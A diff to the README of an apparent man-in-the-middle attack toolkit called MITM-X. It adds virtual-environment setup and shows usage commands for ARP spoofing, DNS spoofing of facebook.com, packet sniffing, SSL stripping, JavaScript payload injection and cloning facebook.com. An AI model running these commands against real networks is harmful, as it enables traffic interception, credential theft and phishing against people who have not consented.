@@ -44,54 +44,139 @@ sudo apt install python3-netfilterqueue iptables-persistent
 
 ## Installation
 
+### Option 1: Quick Setup (Recommended for Virtual Environment)
+
+**For Windows:**
+1. Download or clone the MITM-X framework
+2. Open Command Prompt or PowerShell as Administrator
+3. Navigate to the project directory
+4. Run the setup:
+   ```batch
+   python setup_venv.py
+   ```
+   Or double-click `run_setup.bat`
+
+**For Linux/Kali:**
 1. Clone or download the MITM-X framework
 2. Navigate to the project directory
-3. Run the auto setup script:
+3. Run the setup with sudo:
+   ```bash
+   sudo python3 setup_venv.py
+   ```
 
-```bash
-sudo python3 setup.py
-```
+This will automatically:
+- Create a virtual environment in the `venv/` folder
+- Install all Python dependencies in the virtual environment
+- Install system packages (Linux only)
+- Create configuration files
+- Set up convenience scripts for activation
+
+### Option 2: Manual Setup
+
+1. Create virtual environment:
+   ```bash
+   # Windows
+   python -m venv venv
+   
+   # Linux
+   python3 -m venv venv
+   ```
+
+2. Activate virtual environment:
+   ```bash
+   # Windows
+   venv\Scripts\activate
+   
+   # Linux
+   source venv/bin/activate
+   ```
+
+3. Install dependencies:
+   ```bash
+   pip install -r requirements.txt
+   ```
+
+4. Install system dependencies (Linux only):
+   ```bash
+   sudo apt update
+   sudo apt install python3-netfilterqueue iptables-persistent dsniff ettercap-text-only
+   ```
+
+### Virtual Environment Usage
+
+After setup, you need to activate the virtual environment before running MITM-X:
+
+**Windows:**
+- Double-click `activate_mitm.bat`, OR
+- Run `activate_mitm.ps1` in PowerShell, OR
+- Manually: `venv\Scripts\activate`
+
+**Linux:**
+- Run `./activate_mitm.sh`, OR
+- Manually: `source venv/bin/activate`
+
+Once activated, your command prompt will show `(venv)` prefix, indicating you're in the virtual environment.
 
 ## Usage
 
 ### Quick Start
 
-```bash
-sudo python3 mitm_x.py
-```
+1. **Activate Virtual Environment** (Required):
+   ```bash
+   # Windows
+   activate_mitm.bat
+   # OR for PowerShell
+   .\activate_mitm.ps1
+   
+   # Linux
+   ./activate_mitm.sh
+   # OR manually
+   source venv/bin/activate
+   ```
+
+2. **Run the Framework**:
+   ```bash
+   # Windows (after activation)
+   python mitm_x.py
+   
+   # Linux (after activation, with sudo)
+   sudo python3 mitm_x.py
+   ```
 
 This will launch the interactive command-line interface where you can select and configure different modules.
 
 ### Individual Module Usage
 
+**Note: Activate virtual environment first!**
+
 #### ARP Spoofing
 ```bash
-sudo python3 modules/arp_spoofer.py --target 192.168.1.100 --gateway 192.168.1.1 --interface eth0
+python modules/arp_spoofer.py --target 192.168.1.100 --gateway 192.168.1.1 --interface eth0
 ```
 
 #### DNS Spoofing
 ```bash
-sudo python3 modules/dns_spoofer.py --domain facebook.com --redirect 192.168.1.50
+python modules/dns_spoofer.py --domain facebook.com --redirect 192.168.1.50
 ```
 
 #### Packet Sniffing
 ```bash
-sudo python3 modules/packet_sniffer.py --interface eth0 --output logs/
+python modules/packet_sniffer.py --interface eth0 --output logs/
 ```
 
 #### SSL Strip
 ```bash
-sudo python3 modules/ssl_strip.py --port 8080
+python modules/ssl_strip.py --port 8080
 ```
 
 #### Payload Injection
 ```bash
-sudo python3 modules/payload_injector.py --payload "alert('Hacked!')" --port 8080
+python modules/payload_injector.py --payload "alert('Hacked!')" --port 8080
 ```
 
 #### Web Cloner
 ```bash
-python3 modules/web_cloner.py --url https://facebook.com --output cloned_sites/
+python modules/web_cloner.py --url https://facebook.com --output cloned_sites/
 ```
 
 ### Dashboard Access
